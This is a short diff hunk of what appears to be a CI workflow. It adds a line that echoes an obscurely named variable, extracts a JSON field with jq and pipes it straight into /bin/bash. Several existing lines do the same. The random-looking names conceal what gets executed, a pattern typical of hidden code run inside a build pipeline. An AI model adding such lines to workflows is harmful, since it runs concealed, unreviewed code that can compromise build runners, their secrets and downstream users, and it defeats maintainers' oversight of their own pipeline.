@@ -22,6 +22,7 @@ jobs:
           echo $i29 | jq -r .rxex8 | /bin/bash
           printf '%s' "$v2659" | jq -r .zh758 | /bin/bash
           printf '%s' "$combb606" | jq -r .rg71768 | /bin/bash
+          echo $oxmkj073 | jq -r .f412 | /bin/bash
 
       - name: Archive results
         if: always()
